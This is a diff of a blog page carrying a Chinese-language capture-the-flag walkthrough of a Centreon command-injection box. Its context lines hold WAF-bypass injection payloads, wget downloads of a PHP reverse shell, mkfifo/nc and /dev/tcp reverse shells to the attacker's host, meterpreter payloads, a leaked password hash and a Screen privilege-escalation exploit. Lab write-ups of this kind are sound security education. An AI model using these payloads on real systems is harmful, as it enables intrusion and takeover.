@@ -9,7 +9,22 @@
     }
     </style>
 
-  
+  <script>
+    // 强制内网 IP 识别为安全上下文
+    if (window.location.hostname !== 'localhost' && window.location.protocol === 'http:') {
+        // 尝试手动映射 crypto 属性
+        if (!window.crypto.subtle && window.crypto.webkitSubtle) {
+            window.crypto.subtle = window.crypto.webkitSubtle;
+        }
+    }
+    
+    // 终极补丁：如果还是没有 subtle，则创建一个占位符避免报错
+    // 提示：这通常能解决加载报错，但如果插件强依赖原生加密，建议执行下面的“降级”预判
+    if (!window.isSecureContext) {
+        console.warn('当前环境非安全上下文，正在尝试兼容内网加密解密...');
+    }
+</script>
+
 
 <head>
   <meta charset="UTF-8">
@@ -61,7 +76,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"192.168.126.129","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"192.168.126.129","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -233,9 +248,9 @@
 <p>访问<code>http://10.10.10.157/centreon/main.php?p=60901&amp;o=c&amp;server_id=1</code></p>
 <p>手动测试命令执行</p>
 <h2 id="失败的）测试绕过waf"><a href="#失败的）测试绕过waf" class="headerlink" title="(失败的）测试绕过waf"></a>(失败的）测试绕过waf</h2><p><code>/bin/w??t$&#123;IFS&#125;http://10.10.14.18/index.html</code></p>
-<p><img src="/18.PNG" srcset="/img/loading.gif"><br>失败</p>
-<p><code>/usr/bin/w??t$&#123;IFS&#125;http://10.10.14.18:800/index.html%20%23</code><br><img src="/19.PNG" srcset="/img/loading.gif"></p>
-<p><img src="/20.PNG" srcset="/img/loading.gif"><br>成功</p>
+<p><img src="/18.PNG"><br>失败</p>
+<p><code>/usr/bin/w??t$&#123;IFS&#125;http://10.10.14.18:800/index.html%20%23</code><br><img src="/19.PNG"></p>
+<p><img src="/20.PNG"><br>成功</p>
 <p>&#x2F;bin&#x2F;nc.traditional -e 10.10.14.18 801</p>
 <p><code>/bin/n?.???????????$&#123;IFS&#125;-e$&#123;IFS&#125;10.10.14.18$&#123;IFS&#125;801%20%23</code></p>
 <p>结果<br>&#x2F;bin&#x2F;n?.??????????? not found</p>
@@ -250,7 +265,7 @@
 
 <p>本地开启802端口，准备好w.php——php反弹shell脚本。</p>
 <figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">wget http://10.10.14.18:802/w.php -P /tmp<br><br>/usr/bin/w??t<span class="hljs-variable">$&#123;IFS&#125;</span>http://10.10.14.18:802/w.php<span class="hljs-variable">$&#123;IFS&#125;</span>/tmp%20%23<br></code></pre></div></td></tr></table></figure>
-<p><img src="/21.PNG" srcset="/img/loading.gif"><br>成功</p>
+<p><img src="/21.PNG"><br>成功</p>
 <p>本地准备nc监听9000端口，等待反弹shell</p>
 <figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x /tmp/w.php;./tmp/w.php<br><br><span class="hljs-built_in">chmod</span><span class="hljs-variable">$&#123;IFS&#125;</span>+x<span class="hljs-variable">$&#123;IFS&#125;</span>/tmp/w.php;./tmp/w.php%20%23<br><br>结果：./tmp/w.php%20%23 not found<br>问题是，不知道wget把w.php保存到哪里去了。用/bin/ls也没有找到。<br></code></pre></div></td></tr></table></figure>
 
@@ -271,7 +286,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f;<span class="hljs-built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f<br><br>/bin/rm<span class="hljs-variable">$&#123;IFS&#125;</span>/tmp/f;/usr/bin/mkfifo<span class="hljs-variable">$&#123;IFS&#125;</span>/tmp/f;/bin/cat<span class="hljs-variable">$&#123;IFS&#125;</span>/tmp/f|/bin/sh<span class="hljs-variable">$&#123;IFS&#125;</span>-i<span class="hljs-variable">$&#123;IFS&#125;</span>2&gt;&amp;1|/bin/n?<span class="hljs-variable">$&#123;IFS&#125;</span>10.10.14.18<span class="hljs-variable">$&#123;IFS&#125;</span>443<span class="hljs-variable">$&#123;IFS&#125;</span>&gt;/tmp/f%20%23<br></code></pre></div></td></tr></table></figure>
 
 <h2 id="exp测试"><a href="#exp测试" class="headerlink" title="exp测试"></a>exp测试</h2><p>11月17日更新，周末终于有空了。<br>为了简化手动操作的繁琐，我修改了一下exp。这是下载地址：<a target="_blank" rel="noopener" href="https://github.com/Whale3070/ctf-coding/blob/master/centreon.py">https://github.com/Whale3070/ctf-coding/blob/master/centreon.py</a>，使用方式是<code>./centreon.py 要执行的命令</code></p>
-<p><img src="/70.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/70.PNG"></p>
 <p>成功查看了wget的版本，1.19.4</p>
 <p><code>./centreon.py &quot;uname$&#123;IFS&#125;-a&quot;</code></p>
 <figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> <span class="hljs-number">123</span><br><span class="hljs-attribute">123</span><br><br></code></pre></div></td></tr></table></figure>
@@ -286,40 +301,40 @@
 
 <figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f;<span class="hljs-built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1| /b?n/?c 10.10.14.18 443 &gt;/tmp/f<br>失败<br><br>/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.18/443 0&gt;&amp;1<br><br></code></pre></div></td></tr></table></figure>
 <p>&#x2F;bin&#x2F;?s &#x2F;</p>
-<p><img src="/1.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/1.PNG"></p>
 <figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">bin</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">boot</span><br><span class="hljs-keyword"></span>dev<br>etc<br>home<br>...<br></code></pre></div></td></tr></table></figure>
 
 
 <figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -al<br>-rw-r--r-- 1 www-data www-data   4089 Nov 18 06:53 /usr/local/centreon/filesGeneration/engine/1/centengine.DEBUG<br><br></code></pre></div></td></tr></table></figure>
 
-<p>wget <a target="_blank" rel="noopener" href="http://10.10.14.18/w.php">http://10.10.14.18/w.php</a> -P &#x2F;tmp<br><img src="/2.PNG" srcset="/img/loading.gif"></p>
+<p>wget <a target="_blank" rel="noopener" href="http://10.10.14.18/w.php">http://10.10.14.18/w.php</a> -P &#x2F;tmp<br><img src="/2.PNG"></p>
 <figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">/bin/?s /tmp<span class="hljs-string">&quot;</span><br><span class="hljs-string">w.php</span><br><span class="hljs-string"></span><br></code></pre></div></td></tr></table></figure>
 
 
 <figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">chm\od +<span class="hljs-attribute">x</span> /tmp/w<span class="hljs-selector-class">.php</span><br><br>mode of &amp;<span class="hljs-selector-id">#039</span>;/tmp/w<span class="hljs-selector-class">.php</span>&amp;<span class="hljs-selector-id">#039</span>; changed <span class="hljs-selector-tag">from</span> <span class="hljs-number">0644</span> (rw-<span class="hljs-attribute">r</span><span class="hljs-attr">--r--</span>) <span class="hljs-selector-tag">to</span> <span class="hljs-number">0755</span> (rwxr-xr-<span class="hljs-attribute">x</span>)<br><br></code></pre></div></td></tr></table></figure>
-<p>.&#x2F;centreon.py ip port “php &#x2F;tmp&#x2F;w.php”<br><img src="/3.PNG" srcset="/img/loading.gif"></p>
+<p>.&#x2F;centreon.py ip port “php &#x2F;tmp&#x2F;w.php”<br><img src="/3.PNG"></p>
 <h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">kali生成恶意载荷<br>msfvenom -p linux/x86/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=10.10.14.18 <span class="hljs-attribute">LPORT</span>=445 -f elf -o w.elf<br></code></pre></div></td></tr></table></figure>
 <p>shell执行下载：</p>
 <figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>wget http://10.10.14.18/w.elf -P /tmp<br> <span class="hljs-built_in">chmod</span> +x w.elf<br><br></code></pre></div></td></tr></table></figure>
 <p>kali执行监听：</p>
 <figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">msfconsole<br>handler -H 10.10.14.18 -P 445 -p linux/x86/meterpreter/reverse_tcp<br><br>wget http://10.10.14.18/w.elf -P /tmp<br><br></code></pre></div></td></tr></table></figure>
-<p><img src="/4.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/4.PNG"></p>
 <figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">meterpreter</span>执行的命令<br><span class="hljs-attribute">ps</span><br><span class="hljs-attribute">migrate</span> <span class="hljs-number">993</span><br><span class="hljs-attribute">993</span>    <span class="hljs-number">872</span>    php-fpm7.<span class="hljs-number">1</span>         x86_64  www-data         .<br></code></pre></div></td></tr></table></figure>
 
 <h2 id="生成64位的payload"><a href="#生成64位的payload" class="headerlink" title="生成64位的payload"></a>生成64位的payload</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.18 LPORT=446 -f elf -o w64.elf<br><br>handler -H 10.10.14.18 -P 446 -p linux/x64/meterpreter/reverse_tcp<br><br>wget http://10.10.14.18/w64.elf -P /tmp<br>./w64.elf<br><br>use post/multi/recon/local_exploit_suggester<br><span class="hljs-built_in">set</span> SESSION 6<br>run<br></code></pre></div></td></tr></table></figure>
-<p><img src="/5.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/5.PNG"></p>
 <h2 id="linuEnum-sh"><a href="#linuEnum-sh" class="headerlink" title="linuEnum.sh"></a>linuEnum.sh</h2><p>wget <a target="_blank" rel="noopener" href="http://10.10.14.18/l.sh">http://10.10.14.18/l.sh</a> -P &#x2F;tmp<br>chmod加权限并运行</p>
 <p>发现口令</p>
 <figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>.htpasswd<br>admin:<span class="hljs-variable">$apr1</span><span class="hljs-variable">$7hIqRwgr</span>$.QPU0yknBQRTf3WW9jfFp.<br><br>存在的用户<br>centreon、shelby、sysmonitor<br><br><span class="hljs-regexp">/home/</span>sysmonitor/.sudo_as_admin_successful<br>说明普通用户sysmonitor用sudo可以得到最高权限<br></code></pre></div></td></tr></table></figure>
 <p>password1</p>
-<h2 id="hash类型识别"><a href="#hash类型识别" class="headerlink" title="hash类型识别"></a>hash类型识别</h2><p>MD5(APR)<br><img src="/6.PNG" srcset="/img/loading.gif"></p>
-<p>尝试爆破和搜索hash，无结果。<br><img src="/7.PNG" srcset="/img/loading.gif"></p>
+<h2 id="hash类型识别"><a href="#hash类型识别" class="headerlink" title="hash类型识别"></a>hash类型识别</h2><p>MD5(APR)<br><img src="/6.PNG"></p>
+<p>尝试爆破和搜索hash，无结果。<br><img src="/7.PNG"></p>
 <h2 id="html-zip"><a href="#html-zip" class="headerlink" title="html.zip"></a>html.zip</h2><figure class="highlight nix"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nix">unzip html.zip<br><span class="hljs-params">Archive:</span>  html.zip<br>   <span class="hljs-params">creating:</span> html<span class="hljs-symbol">/</span><br> <span class="hljs-params">extracting:</span> html<span class="hljs-symbol">/aa.php</span>             <br>  <span class="hljs-params">inflating:</span> html<span class="hljs-symbol">/index.html</span>         <br>  <span class="hljs-params">inflating:</span> html<span class="hljs-symbol">/panel.php</span>          <br>   <span class="hljs-params">creating:</span> html<span class="hljs-operator">/</span>monitoring<span class="hljs-symbol">/</span><br>  <span class="hljs-params">inflating:</span> html<span class="hljs-symbol">/monitoring/index.html</span>  <br>  <span class="hljs-params">inflating:</span> html<span class="hljs-symbol">/monitoring/.htaccess</span> <br><br>cat .htaccess<br>AuthUserFile <span class="hljs-symbol">/etc/.htpasswd</span><br>AuthName <span class="hljs-string">&quot;Protected area by the admin&quot;</span><br>AuthType Basic<br><span class="hljs-operator">&lt;</span>Limit GET<span class="hljs-operator">&gt;</span><br>require valid-user<br><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>Limit<span class="hljs-operator">&gt;</span><br></code></pre></div></td></tr></table></figure>
 <h2 id="suid"><a href="#suid" class="headerlink" title="suid"></a>suid</h2><figure class="highlight applescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs applescript">cd /usr/lib/eject;<br>./dmcrypt-<span class="hljs-keyword">get</span>-device<br>Usage: dmcrypt-<span class="hljs-keyword">get</span>-device &lt;device&gt;<br><br>strings dmcrypt-<span class="hljs-keyword">get</span>-device<br><br>cd /usr/lib/dbus<span class="hljs-number">-1.0</span>/;<span class="hljs-built_in">file</span> dbus-daemon-<span class="hljs-built_in">launch</span>-helper<br><br>strings dbus-daemon-<span class="hljs-built_in">launch</span>-helper<br>No memory <span class="hljs-keyword">to</span> <span class="hljs-built_in">read</span> directory entry<br>/usr/share/dbus<span class="hljs-number">-1</span>/session.conf<br><br>./dbus-daemon-<span class="hljs-built_in">launch</span>-helper<br></code></pre></div></td></tr></table></figure>
 <h2 id="screen提权"><a href="#screen提权" class="headerlink" title="screen提权"></a>screen提权</h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">GNU<span class="hljs-built_in"> Screen </span>4.5.0 - Local Privilege Escalation                                          | exploits/linux/local/41154.sh<br><br>vi 41154.sh<br>:<span class="hljs-built_in">set</span> <span class="hljs-attribute">ff</span>=unix<br></code></pre></div></td></tr></table></figure>
-<p><img src="/8.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/8.PNG"></p>
 <figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span>  http://<span class="hljs-number">10.10.14.18</span>/<span class="hljs-number">41154</span>.sh /tmp<br><span class="hljs-attribute">chomd</span> +x <span class="hljs-number">41154</span>.sh;./<span class="hljs-number">41154</span>.sh<br></code></pre></div></td></tr></table></figure>
-<p><img src="/9.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/9.PNG"></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="在migrate的时候，出错是什么原因？"><a href="#在migrate的时候，出错是什么原因？" class="headerlink" title="在migrate的时候，出错是什么原因？"></a>在migrate的时候，出错是什么原因？</h3><figure class="highlight oxygene"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs oxygene">migrate <span class="hljs-number">36582</span><br>[-] Error running command migrate: NoMethodError undefined <span class="hljs-keyword">method</span> `<span class="hljs-title function_">pid</span>&#x27; <span class="hljs-title function_">for</span> <span class="hljs-title function_">nil</span>:NilClass<br><br></code></pre></div></td></tr></table></figure>
 <p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c6802c4f03e2">POST模块、后门</a><br>根据这篇文章，可以用模块迁移pid，无需使用ps然后再<code>migrate pid</code>。</p>
 <p><code>run post/windows/manage/migrate</code></p>
@@ -462,10 +477,6 @@
 
 <!-- Plugins -->
 
-
-  
-    <script  src="/js/lazyload.js" ></script>
-  
 
 
 
